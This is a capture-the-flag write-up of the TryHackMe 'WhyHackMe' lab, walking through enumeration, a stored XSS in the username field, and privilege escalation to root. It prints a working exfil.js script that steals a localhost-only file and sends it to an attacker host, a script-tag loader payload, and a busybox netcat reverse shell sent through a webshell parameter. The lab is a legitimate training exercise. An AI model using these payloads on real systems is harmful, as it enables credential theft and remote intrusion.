---
title: "TryHackMe: WhyHackMe"
collection: publications
permalink: /publication/whyhackme
excerpt: 'This is a free room from TryHackMe'
date: 2024-01-25
venue: '01-25'
#paperurl: 'http://academicpages.github.io/files/paper1.pdf'
#citation: 'Your Name, You. (2009). &quot;Paper Title Number 1.&quot; <i>Journal 1</i>. 1(1).'
---

![header](/images/whyhackme_header.png)

**LINK:** [WhyHackMe](https://tryhackme.com/room/whyhackme)

## Enumeration 

* Let's start off with an nmap scan :

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-25 05:16 EST
Nmap scan report for 10.10.83.163
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.18.0.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47712b907d89b8e9b46a76c1504943cf (RSA)
|   256 cb2997dcfd85d9eaf884980b66105e6f (ECDSA)
|_  256 123f3892a7ba7fdaa7184f0dff56c11f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

* The scan reveals 3 open ports :
    - FTP on port 21
    - SSH on port 22
    - HTTP on port 80

* Connecting anonymously to the FTP server revealed a file named "update.txt."

![whyhackme1](/images/whyhackme1.png)

* This file disclosed that the user ``mike`` had to be removed due to a compromise. The credentials for the new user can be found under ``/dir/pass.txt`` for authorized users accessing via localhost.

![whyhackme2](/images/whyhackme2.png)

* Visiting the HTTP server on port 80 directed to a ``blog.php`` page, indicating PHP usage. 

![whyhackme3](/images/whyhackme3.png)

* Running Gobuster with the ``-x php`` option was initiated to enumerate potential hidden files and directories.

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/Seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php
```
* Exploring the blog.php page, a comment section was discovered which is only available for logged-in users

![whyhackme4](/images/whyhackme4.png)

* There is a link to the login page ``/login.php``. The lack of credentials temporarily halted progress.

![whyhackme5](/images/whyhackme5.png)

* Gobuster results uncovered a ``registration.php`` page, allowing the creation of a new account.

![whyhackme6](/images/whyhackme6.png)

![whyhackme7](/images/whyhackme7.png)

* After registration and login, I attempted to comment, testing the application's response.

![whyhackme8](/images/whyhackme8.png)

* A lot has been tried here, including the Unicode Normalization Bypass, but nothing has worked

![whyhackme9](/images/whyhackme9.png)

* I noticed that the username also appeared in the comments and that it might be vulnerable. I created a new account with the username ``<script>alert(1);</script>`` Upon logging in, I visited /blog.php, and I wrote a comment. Immediately after submitting, the success of the stored XSS attack became evident.

![whyhackme10](/images/whyhackme10.png)

![whyhackme11](/images/whyhackme11.png)

## User Flag : 

* With knowledge of the ``/dir/pass.txt`` file accessible only from localhost and the success of the stored XSS. we can exfiltrate the content of this file through XSS.

* Following this [blog](https://trustedsec.com/blog/simple-data-exfiltration-through-xss) post guide. i Created a file called ``exfil.js``

```bash

function read_body(xhr) 
{ 
	var data;

	if (!xhr.responseType || xhr.responseType === "text") 
	{
		data = xhr.responseText;
	} 
	else if (xhr.responseType === "document") 
	{
		data = xhr.responseXML;
	} 
	else if (xhr.responseType === "json") 
	{
		data = xhr.responseJSON;
	} 
	else 
	{
		data = xhr.response;
	}
	return data; 
}




function stealData()
{
	var uri = "/dir/pass.txt";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);


			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://<your-ip-address>:<listener-port>/exfil/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;   
			};

			downloadImage.src = "http://<your-ip-address>:<listener-port>/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}



stealData();
```
* Starting a web server to host our file, and don't forget to add your ip addresse into the ``exfil.js`` file.

```bash
python3 -m http.server 8000
```

* Now we have to create a new account with ``<script src=http://<your-ip-address>:<listener-port>/exfil.js></script>``

![whyhackme12](/images/whyhackme12.png)

* So now this will happen : 
    - Admin views our comment & the malicious script gets executed.
    - As a result the script makes the server retreive the exfil.js file from our python hosted server & executes it.
    - Once our malicous script gets excecuted I will receive the contents of 127.0.0.1/dir/pass.txt in base64 format to our http server.

![whyhackme13](/images/whyhackme13.png)

* After decoding the base64 content of ``/dir/pass.txt``, credentials for the user "jack" were obtained.

![whyhackme14](/images/whyhackme14.png)

* Logging in via SSH as ``jack`` allowed access to the machine and get the user flag.

## Root Flag : 

* Exploring jack's privileges revealed sudo authorizations for iptables.

![whyhackme15](/images/whyhackme15.png)

* Further investigation led to the discovery of a pcap file and an urgent.txt file in the /opt directory. 

![whyhackme16](/images/whyhackme16.png)

* The urgent.txt file outlined a security incident, indicating a blocked port as a temporary solution. The challenge now was to analyze the pcap file and resolve the issue.

* Looking at ``/usr/lib`` we see that we cannot access cgi-bin and the group is assigned to h4ck3d. This is probably why root cannot delete it.

![whyhackme17](/images/whyhackme17.png)

* Checking the configured rules for iptables.

![whyhackme18](/images/whyhackme18.png)

* So now we know that the Nmap scan didn’t pick up the port 41312 because the incoming packets to that port are dropped.

* Using iptables, we can change the rule to accept all incoming connections to port 41312 using the following command.

![whyhackme19](/images/whyhackme19.png)

* Opening the ``pcap`` file, we have TLS traffic here, and everything is encrypted. Too bad. We only see port 41312 again, which confirms that this is the malicious port.

![whyhackme20](/images/whyhackme20.png)

* The next step is to find the private key file in the victim machine. for that i used the ``find`` command.

![whyhackme21](/images/whyhackme21.png)

* I transferred the private key to my machine to decrypted the traffic by navigating to Edit then Prefernces then TLS . Click on Edit option in RSA Keys List & enter the IP, port, protocol & location of the private key.

![whyhackme22](/images/whyhackme22.png)

* We can filter by ``http`` and see the URI for a webshell.

![whyhackme23](/images/whyhackme23.png)

* We can access ``/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=whoami`` to execute the command ``whoami``. 

![whyhackme24](/images/whyhackme24.png)

* Now in the ``&cmd=`` parameter I used the following reverse shell payload

```bash
busybox nc <your-ip-address> <listener-port> -e sh
```
![whyhackme25](/images/whyhackme25.png)
![whyhackme26](/images/whyhackme26.png)

* The ``www-data`` user can run any command as any user.

![whyhackme27](/images/whyhackme27.png)

* Now we can switch to root and get the second flag.

![whyhackme28](/images/whyhackme28.png)





